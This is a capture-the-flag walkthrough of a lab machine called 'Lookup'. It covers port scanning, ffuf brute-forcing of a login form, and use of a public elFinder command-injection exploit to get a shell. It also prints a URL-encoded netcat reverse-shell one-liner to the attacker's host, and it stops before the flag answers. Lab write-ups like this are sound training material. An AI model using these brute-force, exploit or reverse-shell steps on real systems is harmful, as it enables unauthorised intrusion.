
# Lookup

Test your enumeration skills on this boot-to-root machine.

# Task 1 - Lookup

**Lookup** offers a treasure trove of learning opportunities for aspiring hackers. This intriguing machine showcases various real-world vulnerabilities, ranging from web application weaknesses to privilege escalation techniques. By exploring and exploiting these vulnerabilities, hackers can sharpen their skills and gain invaluable experience in ethical hacking. Through "Lookup," hackers can master the art of reconnaissance, scanning, and enumeration to uncover hidden services and subdomains. They will learn how to exploit web application vulnerabilities, such as command injection, and understand the significance of secure coding practices. The machine also challenges hackers to automate tasks, demonstrating the power of scripting in penetration testing.

**Note:** It is recommended to use your own VM if you'll ever experience problems visualizing the site.

# Solve

## Scan

```
 nmap -n -Pn -sV --min-rate 1000 -v -p- -oN nmap 10.81.166.19
Starting Nmap 7.93 ( https://nmap.org ) at 2026-01-09 23:09 UTC
NSE: Loaded 45 scripts for scanning.
Initiating SYN Stealth Scan at 23:09
Scanning 10.81.166.19 [65535 ports]
Discovered open port 80/tcp on 10.81.166.19
Discovered open port 22/tcp on 10.81.166.19
SYN Stealth Scan Timing: About 46.13% done; ETC: 23:10 (0:00:36 remaining)
Completed SYN Stealth Scan at 23:10, 67.36s elapsed (65535 total ports)
Initiating Service scan at 23:10
Scanning 2 services on 10.81.166.19
Completed Service scan at 23:10, 6.39s elapsed (2 services on 1 host)
NSE: Script scanning 10.81.166.19.
Initiating NSE at 23:10
Completed NSE at 23:10, 0.80s elapsed
Initiating NSE at 23:10
Completed NSE at 23:10, 0.76s elapsed
Nmap scan report for 10.81.166.19
Host is up (0.18s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.60 seconds
```

```
 curl -I 10.81.166.19
HTTP/1.1 302 Found
Date: Fri, 09 Jan 2026 23:12:13 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: http://lookup.thm
Content-Type: text/html; charset=UTF-8
```

```
curl -v 10.81.166.19 -L
*   Trying 10.81.166.19:80...
* Connected to 10.81.166.19 (10.81.166.19) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.81.166.19
> User-Agent: curl/7.88.1
> Accept: */*
>
< HTTP/1.1 302 Found
< Date: Fri, 09 Jan 2026 23:15:24 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Location: http://lookup.thm
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
<
* Connection #0 to host 10.81.166.19 left intact
* Issue another request to this URL: 'http://lookup.thm/'
*   Trying 10.81.166.19:80...
* Connected to lookup.thm (10.81.166.19) port 80 (#1)
> GET / HTTP/1.1
> Host: lookup.thm
> User-Agent: curl/7.88.1
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Fri, 09 Jan 2026 23:15:25 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 719
< Content-Type: text/html; charset=UTF-8
<
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="container">
    <form action="login.php" method="post">
      <h2>Login</h2>
      <div class="input-group">
        <label for="username">Username</label>
        <input type="text" id="username" name="username" required>
      </div>
      <div class="input-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
      </div>
      <button type="submit">Login</button>
    </form>
  </div>
</body>
</html>

```
## Brute pass

```
ffuf -u http://lookup.thm/login.php -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -w /usr/share/wordlists/seclists/passwords/2020-200_most_used_passwords.txt -fw 8

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.thm/login.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/passwords/2020-200_most_used_passwords.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 :: Data             : username=admin&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 8
________________________________________________

password123             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 181ms]
:: Progress: [197/197] :: Job [1/1] :: 70 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

```
ffuf -u http://lookup.thm/login.php -X POST -d "username=FUZZ&password=password123" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -fw 10 -t 300

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.thm/login.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 :: Data             : username=FUZZ&password=password123
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 10
________________________________________________

jose                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 185ms]
:: Progress: [7389/8295455] :: Job [1/1] :: 772 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

## Login
jose 
password123

http://files.lookup.thm/elFinder/elfinder.html

## El exploit

```
searchsploit -m 46481.py
  Exploit: elFinder 2.1.47 - 'PHP connector' Command Injection
      URL: https://www.exploit-db.com/exploits/46481
     Path: /opt/exploitdb/exploits/php/webapps/46481.py
    Codes: CVE-2019-9194
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /root/46481.py

```


```
oot@ip-10-81-80-55:~# mv gato.jpeg SecSignal.jpg
root@ip-10-81-80-55:~# python 46481.py http://files.lookup.thm/elFinder/
[*] Uploading the malicious image...
[*] Running the payload...
[+] Pwned! :)
[+] Getting the shell...
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ 
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.81.80.55%201234%20%3E%2Ftmp%2Ff
```

- https://www.revshells.com/


## Answer the questions below

#### What is the user flag?  



### What is the root flag?